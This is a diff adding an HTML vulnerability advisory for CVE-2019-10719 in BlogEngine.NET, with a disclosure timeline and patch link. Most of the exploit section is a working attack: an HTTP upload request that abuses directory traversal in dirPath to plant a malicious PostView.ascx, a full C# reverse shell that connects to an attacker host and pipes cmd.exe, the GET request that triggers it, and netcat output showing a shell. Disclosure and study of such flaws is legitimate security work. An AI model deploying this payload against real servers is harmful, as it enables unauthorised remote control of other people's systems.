@@ -1,0 +1,97 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns=http://www.w3.org/1999/xhtml><head><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta http-equiv=Content-Style-Type content=text/css><meta name=generator content=pandoc><title></title><style type=text/css>code{white-space: pre;}</style><link rel=stylesheet href=/home/aaron/.VirtualEnvs/rum/local/lib/python2.7/site-packages/sugar/data/default.css></head><body><p>A remote code execution (RCE) vulnerability, <strong>CVE-2019-10719</strong>, was discovered in BlogEngine 3.3.7 and earlier. Leveraging a path traversal in <code>/api/upload</code>, a malicious file could be written to a directory which would allow it to be accessed and executed. <strong>Edit post</strong> permissions are required to upload the shell. Anyone can trigger the shell without authentication.</p><h3 id=vendor-patch><span class=header-section-number>0.0.1</span> Vendor Patch</h3><ul><li><a href=https://github.com/rxtur/BlogEngine.NET/releases class=uri>https://github.com/rxtur/BlogEngine.NET/releases</a></li></ul><h3 id=timeline><span class=header-section-number>0.0.2</span> Timeline</h3><ul><li>30 Mar 2019 - Issue Identified</li><li>31 Mar 2019 - Developer contacted</li><li>04 Apr 2019 - Details of vulnerability sent</li><li>17 Jun 2019 - Public Disclosure</li></ul><h3 id=description><span class=header-section-number>0.0.3</span> Description</h3><p>BlogEngine.NET allows users to upload files through the <code>/api/upload</code> endpoint. Files uploaded using <strong>file</strong>, <strong>filemgr</strong>, or <strong>image</strong> as the <code>action</code> ultimately call <code>BlogService.UploadFile</code> and create the file:</p><div class="has-header codeblock"><div class="command header"> BlogEngine/BlogEngine.NET/AppCode/Api/UploadController.cs </div><div class=output><pre class=inline><code>if (action == &quot;filemgr&quot; || action == &quot;file&quot;)
+{
+    string[] ImageExtensnios = { &quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.tiff&quot;, &quot;.gif&quot;, &quot;.bmp&quot; };
+
+    if (ImageExtensnios.Any(x =&gt; fileName.ToLower().Contains(x.ToLower())))
+        action = &quot;image&quot;;
+    else
+        action = &quot;file&quot;;
+}
+</code></pre><pre class="r-snip inline"><code></code></pre><pre class=inline><code>
+if (action == &quot;image&quot;)
+{
+    if (Security.IsAuthorizedTo(Rights.EditOwnPosts))
+    {
+        dir = BlogService.GetDirectory(dirName);
+        var uploaded = </code></pre><pre class="r-b inline"><code>BlogService.UploadFile(file.InputStream, fileName, dir, true);</code></pre><pre class=inline><code>
+        return Request.CreateResponse(HttpStatusCode.Created, uploaded.AsImage.ImageUrl);
+    }
+}
+if (action == &quot;file&quot;)
+{
+    if (Security.IsAuthorizedTo(Rights.EditOwnPosts))
+    {
+        dir = BlogService.GetDirectory(dirName);
+        var uploaded = </code></pre><pre class="r-b inline"><code>BlogService.UploadFile(file.InputStream, fileName, dir, true);</code></pre><pre class=inline><code>
+        retUrl = uploaded.FileDownloadPath + &quot;|&quot; + fileName + &quot; (&quot; + BytesToString(uploaded.FileSize) + &quot;)&quot;;
+        return Request.CreateResponse(HttpStatusCode.Created, retUrl);
+    }
+}</code></pre></div></div><p>The <strong>dirPath</strong> parameter is used to specify a folder the file will be written to. <strong>dirPath</strong> is vulnerable to directory traversal, allowing files to be written to any directory.</p><p>A malicious <code>PostView.ascx</code> can be written to a sub-directory of <strong>/Custom/Themes</strong>, bypassing the fix for <strong>CVE-2019-6714</strong>. If the folder does not exist, it will be created and contain the malicious <code>PostView.ascx</code>.</p><p><pagebreak></pagebreak></p><h3 id=exploit><span class=header-section-number>0.0.4</span> Exploit</h3><p><a href=https://github.com/irbishop/CVEs/blob/master/2019-10719/exploit.py class=uri>https://github.com/irbishop/CVEs/blob/master/2019-10719/exploit.py</a></p><p>The following will upload the file to <strong>/Custom/Themes/RCE_Test</strong>. <strong>RCE_Test</strong> will be created if it does not exist:</p><div class="no-header codeblock"><div class=output><pre class=inline><code>POST /api/upload?action=filemgr&amp;dirPath=%2f..%2f..%2fCustom%2fThemes%2fRCE_Test HTTP/1.1
+Host: </code></pre><pre class="r-var inline"><code>$RHOST</code></pre><pre class=inline><code>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/plain
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=</code></pre><pre class="r-redacted inline"><code>Test</code></pre><pre class=inline><code>
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063
+Content-Length: 2085
+
+-----------------------------12143974373743678091868871063
+Content-Disposition: form-data; filename=&quot;PostView.ascx&quot;
+
+&lt;%@ Control Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; EnableViewState=&quot;false&quot; Inherits=&quot;BlogEngine.Core.Web.Controls.PostViewBase&quot; %&gt;
+&lt;%@ Import Namespace=&quot;BlogEngine.Core&quot; %&gt;
+
+&lt;script runat=&quot;server&quot;&gt;
+    static System.IO.StreamWriter streamWriter;
+    protected override void OnLoad(EventArgs e) {
+        base.OnLoad(e);
+    using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(&quot;</code></pre><pre class="r-var inline"><code>$LHOST</code></pre><pre class=inline><code>&quot;, </code></pre><pre class="r-var inline"><code>$LPORT</code></pre><pre class=inline><code>)) {
+        using(System.IO.Stream stream = client.GetStream()) {
+            using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
+                streamWriter = new System.IO.StreamWriter(stream);
+                StringBuilder strInput = new StringBuilder();
+                System.Diagnostics.Process p = new System.Diagnostics.Process();
+                p.StartInfo.FileName = &quot;cmd.exe&quot;;
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardInput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
+                p.Start();
+                p.BeginOutputReadLine();
+
+                while(true) {
+                    strInput.Append(rdr.ReadLine());
+                    p.StandardInput.WriteLine(strInput);
+                    strInput.Remove(0, strInput.Length);
+    } } } } }
+
+    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
+        StringBuilder strOutput = new StringBuilder();
+
+        if (!String.IsNullOrEmpty(outLine.Data)) {
+            try {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+            } catch (Exception err) { }
+        }
+    }
+&lt;/script&gt;
+&lt;asp:PlaceHolder ID=&quot;phContent&quot; runat=&quot;server&quot; EnableViewState=&quot;false&quot;&gt;&lt;/asp:PlaceHolder&gt;
+
+-----------------------------12143974373743678091868871063--</code></pre></div></div><p><pagebreak></pagebreak></p><p>Open a <code>netcat</code> listener, <code>nc -nlvp $LPORT</code>, and browse to the application root with the <strong>theme</strong> set to RCE_Test.</p><div class="no-header codeblock"><div class=output><pre class=inline><code>GET /?theme=RCE_Test HTTP/1.1
+Host: </code></pre><pre class="r-var inline"><code>$RHOST</code></pre><pre class=inline><code>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1</code></pre></div></div><div class="has-header codeblock"><div class="command header"> nc -nlvp $LPORT </div><div class=output><pre class=inline><code>listening on [any] </code></pre><pre class="r-var inline"><code>$LPORT</code></pre><pre class=inline><code> ...
+connect to [</code></pre><pre class="r-var inline"><code>$LHOST</code></pre><pre class=inline><code>] from (UNKNOWN) [</code></pre><pre class="r-var inline"><code>$RHOST</code></pre><pre class=inline><code>] 49958
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</code></pre></div></div></body></html>
